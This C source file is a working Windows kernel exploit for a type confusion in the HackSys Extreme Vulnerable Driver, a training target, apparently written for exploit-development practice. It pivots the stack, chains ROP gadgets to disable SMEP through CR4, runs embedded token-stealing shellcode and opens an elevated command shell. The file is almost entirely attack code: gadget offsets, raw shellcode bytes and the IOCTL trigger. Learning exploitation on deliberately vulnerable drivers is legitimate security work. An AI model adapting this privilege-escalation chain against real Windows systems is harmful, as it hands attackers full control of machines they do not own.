#include "Common.h"
#include "Exploits.h"

/*
   HEVD Type Confusion / Medium Integrity

   Author: @xct_de
   Target: 10.0.19044

   This type confusion essentially just executes at a addr we give it. We pivot the stack & use to ROP to disable SMEP.

   Debug: 
   ba e1 HEVD!TypeConfusionObjectInitializer+0x37
   dq rbx+8
   bp ...
*/

int HevdTypeConfusionMI2(int argc, char** argv) {
	printf("~-----------------------------~\n");
	printf("  Running HevdTypeConfusionMI  \n");
	printf("~-----------------------------~\n");

	// static gadgets, adjust for other kernel version
	DWORD STACK_PIVOT = 0x5988ce; //0x1405988ce: mov esp, 0x83000000 ; ret ;
	QWORD STACK_PIVOT_ADDR = 0x83000000;
	DWORD MOV_CR4_RCX = 0x514999;
	DWORD POP_RCX = 0x99710c;

	BOOL resultIOCTL = false;

	typedef struct _TypeConfBuffer
	{
		uintptr_t junkClientID;
		uintptr_t controllableFunc;
	} TypeConfBuffer;

	
	// TokenStealingBail Shellcode
	BYTE sc[256] = {
		0x48, 0x31, 0xc0, 0x65, 0x48, 0x8b, 0x80, 0x88, 0x01, 0x00,
		0x00, 0x48, 0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x49, 0x89,
		0xc1, 0x48, 0x8b, 0x80, 0x48, 0x04, 0x00, 0x00, 0x48, 0x8b,
		0x00, 0x48, 0x8b, 0x50, 0xf8, 0x49, 0x89, 0xc0, 0x48, 0x8b,
		0x00, 0x48, 0x83, 0xfa, 0x04, 0x75, 0xf0, 0x49, 0x8b, 0x50,
		0x70, 0x48, 0x83, 0xe2, 0xf8, 0x49, 0x8b, 0x89, 0xb8, 0x04,
		0x00, 0x00, 0x48, 0x83, 0xe1, 0x07, 0x48, 0x01, 0xca, 0x49,
		0x89, 0x91, 0xb8, 0x04, 0x00, 0x00, 0x65, 0x48, 0x8b, 0x04,
		0x25, 0x88, 0x01, 0x00, 0x00, 0x66, 0x8b, 0x88, 0xe4, 0x01,
		0x00, 0x00, 0x66, 0xff, 0xc1, 0x66, 0x89, 0x88, 0xe4, 0x01,
		0x00, 0x00, 0x48, 0x8b, 0x90, 0x90, 0x00, 0x00, 0x00, 0x48,
		0x8b, 0x8a, 0x68, 0x01, 0x00, 0x00, 0x4c, 0x8b, 0x9a, 0x78,
		0x01, 0x00, 0x00, 0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00,
		0x48, 0x8b, 0xaa, 0x58, 0x01, 0x00, 0x00, 0x31, 0xc0, 0x0f,
		0x01, 0xf8, 0x48, 0x0f, 0x07, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff
	};

	HANDLE hDriver = CreateFile(L"\\\\.\\HacksysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hDriver == INVALID_HANDLE_VALUE)
	{
		printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
		exit(1);
	}

	// get base address of kernel & driver (only works from medium integrity)
	ULONGLONG ntBase = getBaseAddr(L"ntoskrnl.exe");
	printf("[>] NT base: %llx\n", ntBase);

	// sc buffer
	LPVOID sc_ptr = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	printf("[>] Shellcode: %llx\n", sc_ptr);
	RtlCopyMemory(sc_ptr, sc, sizeof(sc));

	// fake stack buffer
	DWORD stack_addr = STACK_PIVOT_ADDR - 0x1000;
	printf("[*] Allocating fake stack @ %llx\n", stack_addr);
	LPVOID stack_ptr = VirtualAlloc((LPVOID)stack_addr, 0x14000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("[>] Fake Stack: %llx\n", stack_ptr);
	
	printf("Press enter to continue..\n");
	getchar();

	// push & read some values in the fake stack region to make sure its paged
	int step = 0x800;
	for (int i = 0; i <= 0x15000/ step; i++) {
		*(QWORD*)((QWORD)stack_ptr + i * step) = 0xdeadc0de;
		printf("  %llx %llx\n", (QWORD)stack_ptr + i * step, *(QWORD*)((QWORD)stack_ptr + i * step));
		*(QWORD*)((QWORD)stack_ptr + i * step) = 0x0;
	}	

	// prepare rop to disable smep & jump to sc_ptr
	QWORD rop = STACK_PIVOT_ADDR;
	*(QWORD*)(rop) = ntBase + POP_RCX;
	*(QWORD*)(rop + 8) = 0x50ef8; // rcx value with 20th bit zeroed out
	*(QWORD*)(rop + 16) = ntBase + MOV_CR4_RCX;
	*(QWORD*)(rop + 24) = (ULONGLONG)sc_ptr;

	// exploit type confusion, will execute our stack_pivot & return into the fake stack
	TypeConfBuffer tcBuf = { 0 };
	tcBuf.junkClientID = 0xAABBCCDDEEFFEEDD;
	tcBuf.controllableFunc = (ULONG_PTR)ntBase + STACK_PIVOT;

	printf("\n[>] Press enter to exploit...\n");
	getchar();

	DeviceIoControl(hDriver, IOCTL(0x808), &tcBuf, sizeof(tcBuf), NULL, 0, NULL, NULL);
	system("cmd.exe");
	return 0;
}